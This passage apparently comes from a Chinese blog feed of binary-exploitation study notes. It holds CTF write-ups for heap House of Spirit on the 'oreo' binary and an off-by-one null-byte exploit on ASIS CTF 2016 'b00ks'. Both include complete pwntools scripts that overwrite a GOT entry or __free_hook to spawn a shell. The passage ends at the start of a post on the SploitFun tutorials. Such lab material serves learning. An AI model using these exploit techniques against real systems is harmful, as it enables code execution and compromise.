。</p><p>这里我们利用leave函数的功能进行绕过，这个选项是在0x0804a2c0处开始修改，得修改伪造的chunk的下一个size位为合适的大小</p><ol start="4"><li>成功free后，我们下一次申请的内存地址就会从 0x0804a2a8开始了，然后把这个地方改为strlen的got表，调用leave选项的函数，这里修改完后就会直接调用strlen函数，相当于system（输入的内容），所以这里要用system的地址+’;bin/sh’，用来拿到shell，用分号是分开调用，这里实际会调用system（system地址）+system（bin/sh）</li></ol><h2 id="gdb调试-2"><a class="markdownIt-Anchor" href="#gdb调试-2"></a> Gdb调试</h2><p>首先创建4个chunk进行实验，可以看到0x0804a2a8的位置存储的是0x0804a2c0，0x0804a2a4位置存储的是4。</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112835587.png" alt="image-20210802112835587" style="zoom:80%;"><p>查看一个chunk，可以看到和我们猜测的结构一致</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112903550.png" alt="image-20210802112903550" style="zoom:80%;"><p>使用leave功能，可以看到输入的内容存放在了0x804a2c0的位置</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112917060.png" alt="image-20210802112917060" style="zoom:80%;"><p>开始时利用name的溢出把第一个申请的chunk的前项指针覆盖成put的got表地址</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802113023666.png" alt="image-20210802113023666" style="zoom:80%;"><p>创建40个chunk，然后用leave写入0x804a2c0伪造fastbin的内存情况</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802113036589.png" alt="image-20210802113036589" style="zoom:80%;"><p>Free之后成功把0x804a2a0的内存地址放入了fastbin</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802113049179.png" alt="image-20210802113049179" style="zoom:80%;"><h3 id="payload脚本"><a class="markdownIt-Anchor" href="#payload脚本"></a> Payload脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding=UTF-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.binary = <span class="hljs-string">&quot;./oreo&quot;</span><br>oreo = ELF(<span class="hljs-string">&quot;./oreo&quot;</span>)<br><span class="hljs-keyword">if</span> args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>]:<br>    p = remote(ip, port)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./oreo&quot;</span>)<br>log.info(<span class="hljs-string">&#x27;PID: &#x27;</span> + <span class="hljs-built_in">str</span>(proc.pidof(p)[<span class="hljs-number">0</span>]))<br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">descrip, name</span>):</span><br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(name)<br>    p.sendline(descrip)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show_rifle</span>():</span><br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;===================================\n&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">order</span>():</span><br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leave</span>(<span class="hljs-params">notice</span>):</span><br>    p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendline(notice)<br><br>name = <span class="hljs-number">27</span> * <span class="hljs-string">&#x27;a&#x27;</span> + p32(oreo.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(oreo.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>add(<span class="hljs-number">25</span> * <span class="hljs-string">&#x27;a&#x27;</span>, name)<br><span class="hljs-comment">#gdb.attach(p)</span><br>show_rifle()<br>p.recvuntil(<span class="hljs-string">&#x27;===================================\n&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;Description: &#x27;</span>)<br>puts_addr = u32(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:<span class="hljs-number">4</span>])<br>libc_base = puts_addr - libc.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#创建0x40个堆快把0x804A2A4伪造chunk的size值</span><br>chunk = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> chunk &lt; <span class="hljs-number">0x40</span>-<span class="hljs-number">1</span>:<br>    add(<span class="hljs-number">25</span> * <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">27</span> + p32(<span class="hljs-number">0</span>))<br>    chunk += <span class="hljs-number">1</span><br><span class="hljs-comment">#最后一个chunk把上一个chunk地址位置改成0x0804a2a8</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">27</span> + p32(<span class="hljs-number">0x0804a2a8</span>)<br>add(<span class="hljs-number">25</span> * <span class="hljs-string">&#x27;a&#x27;</span>, payload)<br><span class="hljs-comment">#满足伪造fastbin的fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 条件</span><br>payload = <span class="hljs-number">0x20</span> * <span class="hljs-string">&#x27;\x00&#x27;</span> + p32(<span class="hljs-number">0x0</span>) + p32(<span class="hljs-number">0x88</span>)<br>leave(payload)<br>order()<br>p.recvuntil(<span class="hljs-string">&#x27;Okay order submitted!\n&#x27;</span>)<br><br>payload = p32(oreo.got[<span class="hljs-string">&#x27;strlen&#x27;</span>])<br>add(payload, <span class="hljs-string">&#x27;b&#x27;</span> * <span class="hljs-number">20</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br>leave(p32(system_addr) + <span class="hljs-string">&#x27;;/bin/sh\x00&#x27;</span>)<br><br>p.interactive()<br><br><br></code></pre></td></tr></table></figure><h1 id="实验十一-off-by-one-漏洞基于堆"><a class="markdownIt-Anchor" href="#实验十一-off-by-one-漏洞基于堆"></a> 实验十一-Off-By-One 漏洞（基于堆）</h1><h2 id="漏洞原理-3"><a class="markdownIt-Anchor" href="#漏洞原理-3"></a> 漏洞原理</h2><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误（这在 C 语言初学者中很常见）导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><p>一般来说，单字节溢出被认为是难以利用的，但是因为 Linux 的堆管理机制 ptmalloc 验证的松散性，基于 Linux 堆的 off-by-one 漏洞利用起来并不复杂，并且威力强大。</p><p>off-by-one 利用思路</p><p>1.溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法</p><p>2.溢出字节为 NULL 字节：在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。（1） 这时可以选择使用 unlink 方法（见 unlink 部分）进行处理。（2） 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。此方法的关键在于 unlink 的时候没有检查按照 prev_size 找到的块的大小与prev_size 是否一致。<strong>（<strong><strong>glibc2.28</strong></strong>前版本有效）</strong></p><p>下面是ctf例题：</p><h2 id="asis-ctf-2016-b00ks"><a class="markdownIt-Anchor" href="#asis-ctf-2016-b00ks"></a> Asis CTF 2016 b00ks</h2><h3 id="程序分析-3"><a class="markdownIt-Anchor" href="#程序分析-3"></a> 程序分析</h3><p>该程序是64位，开启了nx和pie，注意这里开启了Full RELRO保护，不能进行复写got表的操作，需要考虑劫持之类的操作</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115028455.png" alt="image-20210802115028455" style="zoom:80%;"><p>主函数如下</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115046771.png" alt="image-20210802115046771" style="zoom:80%;"><p>有几个功能，增，删，改，查看，还有个修改authorname的功能，<strong>这个函数在一开始就会调用一次</strong>，而我们的漏洞点就是出在这里。函数内部如下</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115104551.png" alt="image-20210802115104551" style="zoom:80%;"><p>sub_9f5内容</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115119997.png" alt="image-20210802115119997" style="zoom:67%;"><p>可以看到是把我们的输入一个个进行读取，但是这里有一个漏洞，如果我们输入的是32个字节，因为循环是从0开始，当到31的时候我们输入的读取就已经结束了，但是循环还会继续一次，最后会把*buf的第33位置为\x00，这就是off by one的null字节溢出。</p><p>新建book的函数</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115140653.png" alt="image-20210802115140653" style="zoom:80%;"><p>要求输入一个name和一个description，name的大小说是最大为32，但是实际上这里并没有检查，可以创建我们想要的大小，description也一样。</p><p>Name和description创建完后还会创建一个结构体用来存储book的指针</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115429476.png" alt="image-20210802115429476" style="zoom:80%;"><p>这个结构体大概内容是</p><p>0x0 book的id</p><p>0x8 book的name的地址</p><p>0x10 book的description的地址</p><p>0x18 book的size</p><p>然后会把这个结构体的指针放在*((_QWORD *)off_202010 + v2)的位置，这个位置实际上就是author_name(off_202018)的位置+0x20的地方，也就是说如果输入了32个字节的author_name，那么最后的\x00就会覆盖到第一个创建的book的低地址。</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115447627.png" alt="image-20210802115447627" style="zoom:80%;"><p>删除函数</p><img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802115530189.png" alt="image-20210802115530189" style="zoom:80%;"><p>编辑函数，根据off_202010位置存放的结构体指针进行编辑</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809144352252.png" alt="image-20210809144352252" style="zoom:80%;"><p>展示book的函数，这里还会把author_name展示出来</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809144405729.png" alt="image-20210809144405729" style="zoom:80%;"><p>选项5是和开头一样的修改author_name的函数，就不再展示</p><h3 id="利用思路-3"><a class="markdownIt-Anchor" href="#利用思路-3"></a> 利用思路</h3><p>1.首先因为author_name紧接着就是book1结构体的地址，如果溢出了一个\x00就会覆盖到book1的结构体地址，，这个后面会用到，因为我们是先输入的name，那么如果先输入32字节的name，再创建book1的话，book1的地址就会覆盖name末尾的截断字符，如果选择5输出了author_name的话，就可以输出book1的地址了。</p><p>2.<strong>libc****基址泄露方法</strong></p><p>因为题目开启了pie，而且没有特别明显的libc基址泄露，但是这里有一个技巧，如果我们申请的内存块足够大，就会调用mmap来扩展内存，由于调用mmap分配的内存和libc基址的偏移是固定的，我们只要泄露book2分配内存的地址就可以知道libc基址</p><p>验证：这里创建book2申请了2个大小0x21000的空间</p><p>选择Book2的name存储的地址是  0x00007f9899a27010，libc加载的基址是</p><p>0x00007f9899475000，偏移为0x00007f9899a27010-0x00007f9899475000=0x5b2010</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809144439572.png" alt="image-20210809144439572" style="zoom:80%;"><p>第二次申请的结果</p><p>Name的内存地址是0x00007f4a27340010，libc基址是0x00007f4a26d8e000，偏移为0x00007f4a27340010-0x00007f4a26d8e000=0x5b2010，可以看到2次申请偏移是一样的</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809144457875.png" alt="image-20210809144457875" style="zoom:80%;"><p>可以看到这里偏移是一样的</p><p>3.<strong>泄露book2****地址的方法</strong></p><p>这里可以利用off by one的漏洞，因为我们的选项5可以重新修改一开始设置的author_name，然后让末尾的\x00覆盖掉book1的结构体指针（这里要注意，我们可以修改的区域是book1的name和description，创建book1的时候要让这两个区域能修改到覆盖后的book1的结构体指针），这样就可以在这个区域伪造一个fake chunk，把name和description的指针修改为book2结构体指针的name和description的地址（由于每次申请的结构体是0x20，所以可以通过泄露的book1结构体的地址进行计算），就可以利用printf选项打印出book2申请的name和description的地址了，然后利用这个地址计算libc的基址。</p><p>4.<strong>拿到shell</strong></p><p>这里需要利用__free_hook函数，<strong>当调用<strong><strong>free</strong></strong>函数的时候__free_hook<strong><strong>函数不为NULL</strong></strong>会优先调用__free_hook****里面所写的内容</strong>，我们可以利用编辑功能把book2的结构体中指向description的指针修改为__free_hook函数，再利用编辑功能编辑book2，修改__free_hook的内容为onegadget的execve(&quot;/bin/sh&quot;, rsp+0x30, environ)，然后执行free book2，当free了book2的description指针的时候就会执行__free_hook里的内容拿到shell。</p><h3 id="gdb调试-3"><a class="markdownIt-Anchor" href="#gdb调试-3"></a> Gdb调试</h3><p>验证输入author_name的off by one</p><p>首先在一开始输入author_name的时候输入32个A，然后创建book1和book2，这里需要用到find命令寻找A存储的地方</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809144526836.png" alt="image-20210809144526836" style="zoom:80%;"><p>可以看到book1的地址覆盖了author_name末尾的\x00</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145420604.png" alt="image-20210809145420604" style="zoom:80%;"><p>这时候选择打印功能就会输出book1结构体的内容了</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145450859.png" alt="image-20210809145450859" style="zoom:80%;"><p>然后再次选择修改author_name输入32个A导致了book1结构体地址末尾被覆盖成了\x00（这里重新调试了，可以看到如果分配的内存大小固定的话，重新调试末尾的地址是一样的）</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145520725.png" alt="image-20210809145520725" style="zoom:80%;"><p>这里查看分配的堆快，我们需要把description的区域分配到能够控制到覆盖后的（这里是0x559595831100）的地方，就可以伪造book1结构体的chunk了</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145539011.png" alt="image-20210809145539011" style="zoom:80%;"><p>这里编辑book1的description+0x20的偏移就可以编辑到通过off by one 覆盖的0x559595831100的地方进行伪造chunk了（注意这里需要之前创建description有足够的大小）</p><p>然后伪造book1的结构体把name和description的位置写入book2的name和description的结构体指针的地址(相对book1结构体地址的偏移为0x38和0x40)</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145655945.png" alt="image-20210809145655945" style="zoom:80%;"><p>再次选择打印就会打印出book2通过mmap分配的内存的地址了</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145720528.png" alt="image-20210809145720528" style="zoom:80%;"><p>之后的利用就和利用思路一样，利用编辑功能把book2的结构体（这里是伪造book1的description）中指向description的指针修改为__free_hook函数，再利用编辑功能编辑book2，修改__free_hook的内容为onegadget的execve(&quot;/bin/sh&quot;, rsp+0x30, environ)，然后执行free book2，当free了book2的description指针的时候就会执行__free_hook里的内容拿到shell。</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210809145752158.png" alt="image-20210809145752158" style="zoom:80%;"><h3 id="payload脚本-2"><a class="markdownIt-Anchor" href="#payload脚本-2"></a> Payload脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding=UTF-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>binary=ELF(<span class="hljs-string">&quot;b00ks&quot;</span>)<br>libc=ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)<br>p=process(<span class="hljs-string">&quot;./b00ks&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">name_size,name,des_size,des</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(name_size))<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(name)<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(des_size))<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(des)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">printbook</span>():</span><br>    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_authorname</span>(<span class="hljs-params">name</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;5&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(name)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">editbook</span>(<span class="hljs-params">book_id,new_des</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.writeline(<span class="hljs-built_in">str</span>(book_id))<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(new_des)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">book_id</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;&gt; &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(book_id))<br><br>p.recvuntil(<span class="hljs-string">&quot;name: &quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">32</span>)<br><span class="hljs-comment">#需要创建满足book1的des区域可以修改到通过off by one修改后的内存区域</span><br>new(<span class="hljs-number">176</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-number">88</span>,<span class="hljs-string">&quot;a&quot;</span>)<br><br><span class="hljs-comment">#创建2个大的内存区域，使用mmap分配</span><br>new(<span class="hljs-number">0x21000</span>,<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-number">0x21000</span>,<span class="hljs-string">&quot;a&quot;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>printbook()<br>p.recvuntil(<span class="hljs-string">&quot;Author: &quot;</span>)<br>book1_addr=u64(p.recvline()[<span class="hljs-number">32</span>:<span class="hljs-number">32</span>+<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;book1_address:&quot;</span>+<span class="hljs-built_in">hex</span>(book1_addr))<br><br><span class="hljs-comment">#伪造fake chunk</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x20</span>+p64(<span class="hljs-number">1</span>)+p64(book1_addr+<span class="hljs-number">0x38</span>)+p64(book1_addr+<span class="hljs-number">0x40</span>)+p64(<span class="hljs-number">0xffff</span>)<br>editbook(<span class="hljs-number">1</span>,payload)<br><span class="hljs-comment">#gdb.attach(p)</span><br>read_authorname(<span class="hljs-string">&quot;A&quot;</span>*<span class="hljs-number">32</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>printbook()<br>p.recvuntil(<span class="hljs-string">&quot;Name: &quot;</span>)<br>book2_name_addr=u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Description: &quot;</span>)<br>book2_des_addr=u64(p.recvline()[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>log.success(<span class="hljs-string">&quot;book2 name addr:&quot;</span>+<span class="hljs-built_in">hex</span>(book2_name_addr))<br>log.success(<span class="hljs-string">&quot;book2 des addr:&quot;</span>+<span class="hljs-built_in">hex</span>(book2_des_addr))<br><br><span class="hljs-comment">#用book2的name和des到libc基址的偏移计算libc基址</span><br>libc_base=book2_name_addr-<span class="hljs-number">0x5b2010</span><br>log.success(<span class="hljs-string">&quot;libc base:&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#gdb.attach(p)</span><br>free_hook=libc_base+libc.symbols[<span class="hljs-string">&quot;__free_hook&quot;</span>]<br>one_gadget=libc_base+<span class="hljs-number">0x4527a</span> <br>log.success(<span class="hljs-string">&quot;free_hook:&quot;</span>+<span class="hljs-built_in">hex</span>(free_hook))<br>log.success(<span class="hljs-string">&quot;one_gadget:&quot;</span>+<span class="hljs-built_in">hex</span>(one_gadget))<br><br><span class="hljs-comment">#修改book2的des为free_hook的地址，然后把内容改为one_gadget</span><br>editbook(<span class="hljs-number">1</span>,p64(free_hook))<br>editbook(<span class="hljs-number">2</span>,p64(one_gadget))<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#进行free的操作调用free_hook劫持</span><br><br>delete(<span class="hljs-number">2</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《SploitFun Linux x86 Exploit 开发系列教程》学习</title>
    <link href="/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/23/SploitFun-Linux-x86-Exploit-%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B-%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>0x00：</strong></p><p>其实这篇博客是后来上传的了，这居然是我们的网络攻防实验课的作业，当时我选的方向是二进制，《SploitFun Linux x86 Exploit 开发系列教程》这书确实不错，很多基本的二进制漏洞都有了，吐槽下：<strong>就是书里面很多二进制漏洞都是用的内存中的绝对地址，这意味着你要自己调试知道地址是多少</strong>，还有坑就是如果在你的环境下调试出来的地址<strong>带有/x00之类的截断字符</strong>，就有可能被截断，然后实验不成功。这里只有前7个实验，实验8未成功，以及之后堆的实验都是<strong>需要一定的环境才能复现，有些漏洞现在早已不能使用</strong>，建议直接使用ctf题目学习。</p><h1 id="实验一典型的基于堆栈的缓冲区溢出"><a class="markdownIt-Anchor" href="#实验一典型的基于堆栈的缓冲区溢出"></a> 实验一：典型的基于堆栈的缓冲区溢出</h1><p><strong>实验平台：<strong><strong>ubuntu 12.04 LTS</strong></strong>（<strong><strong>x86</strong></strong>）</strong></p><p><strong>Glibc</strong>**：****(Ubuntu EGLIBC 2.15-0ubuntu10.6) 2.15**</p><p>什么是缓冲区溢出？ 将源缓冲区复制到目标缓冲区可能导致溢出</p><p>1、源字符串长度大于目标字符串长度。</p><p>2、不进行大小检查。</p><p>缓冲区溢出有两种类型：</p><p>1、基于堆栈的缓冲区溢出 - 这里的目标缓冲区位于堆栈中</p><p>2、基于堆的缓冲区溢出 - 这里的目标缓冲区位于堆中</p><p>漏洞代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//vuln.c</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span 